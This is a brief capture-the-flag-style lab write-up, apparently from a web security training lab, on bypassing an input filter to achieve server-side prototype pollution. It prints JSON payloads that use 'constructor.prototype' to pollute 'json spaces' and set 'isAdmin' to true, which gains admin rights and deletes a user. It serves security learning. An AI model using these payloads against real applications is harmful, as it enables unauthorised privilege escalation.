# Bypassing flawed input filters for server-side prototype pollution
So - first, I wanted to see if I could see a change in behavior when sending a proto object.
```json
{
[...]
	"__proto__":{
        "json spaces":1
    }
}
```
This yielded nothing though. Then I tired obfuscating the proto name in case it just removed `__proto__` from the name.
```json
{
[...]
	"__pr__proto__oto__":{
        "json spaces":1
    }
}
```
This got reflected back to me as a literal named "__pr__proto__oto__" which indicated that this is not an option. Then I tried Adding a proto inside another object - but this did nothing. Then I moved on to try the constructor object instead - this worked. First I managed to pollute `json spaces`
```json
{
	"constructor":{
        "prototype" :  {
            "json spaces": 1
        }
    }
}
```
Then I polluted the isAdmin object.
```json
{
	"constructor":{
        "prototype" :  {
            "isAdmin":true
        }
    }
}
```
I could then delete the Carlos user and solve the lab.